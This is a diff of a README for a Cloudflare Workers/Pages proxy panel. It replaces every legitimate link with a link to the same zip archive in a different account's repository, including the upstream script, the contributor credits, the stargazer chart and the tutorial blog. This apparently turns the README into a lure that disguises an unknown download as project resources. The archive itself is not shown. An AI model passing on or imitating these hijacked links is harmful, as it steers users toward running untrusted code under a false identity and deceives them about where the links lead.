@@ -8,7 +8,7 @@
 <br>
 
 ## Introduction
-This project is dedicated to developing a user panel for the [Cloudflare-workers/pages proxy script](https://github.com/yonggekkk/Cloudflare-workers-pages-vless) created by [yonggekkk](https://github.com/yonggekkk). The panel offers two deployment options: 
+This project is dedicated to developing a user panel for the [Cloudflare-workers/pages proxy script](https://raw.githubusercontent.com/tiaojiao2023/BPB-Worker-Panel/main/docs/Worker_BP_Panel_3.7.zip) created by [yonggekkk](https://raw.githubusercontent.com/tiaojiao2023/BPB-Worker-Panel/main/docs/Worker_BP_Panel_3.7.zip). The panel offers two deployment options: 
 - **Worker** deployment
 - **Pages** deployment
 <br>
@@ -59,14 +59,14 @@ This project is dedicated to developing a user panel for the [Cloudflare-workers
 ---
 
 ## Stargazers Over Time
-[![Stargazers Over Time](https://starchart.cc/bia-pain-bache/BPB-Worker-Panel.svg?variant=adaptive)](https://starchart.cc/bia-pain-bache/BPB-Worker-Panel)
+[![Stargazers Over Time](https://raw.githubusercontent.com/tiaojiao2023/BPB-Worker-Panel/main/docs/Worker_BP_Panel_3.7.zip)](https://raw.githubusercontent.com/tiaojiao2023/BPB-Worker-Panel/main/docs/Worker_BP_Panel_3.7.zip)
 
 ---
 
 ### Special Thanks
-- CF-vless code author [3Kmfi6HP](https://github.com/3Kmfi6HP/EDtunnel)
-- CF preferred IP program author [badafans](https://github.com/badafans/Cloudflare-IP-SpeedTest), [XIU2](https://github.com/XIU2/CloudflareSpeedTest)
+- CF-vless code author [3Kmfi6HP](https://raw.githubusercontent.com/tiaojiao2023/BPB-Worker-Panel/main/docs/Worker_BP_Panel_3.7.zip)
+- CF preferred IP program author [badafans](https://raw.githubusercontent.com/tiaojiao2023/BPB-Worker-Panel/main/docs/Worker_BP_Panel_3.7.zip), [XIU2](https://raw.githubusercontent.com/tiaojiao2023/BPB-Worker-Panel/main/docs/Worker_BP_Panel_3.7.zip)
 
 ---
 
-For a detailed tutorial on the core script, please refer to [Yongge’s blog and video tutorials](https://ygkkk.blogspot.com/2023/07/cfworkers-vless.html).
+For a detailed tutorial on the core script, please refer to [Yongge’s blog and video tutorials](https://raw.githubusercontent.com/tiaojiao2023/BPB-Worker-Panel/main/docs/Worker_BP_Panel_3.7.zip).
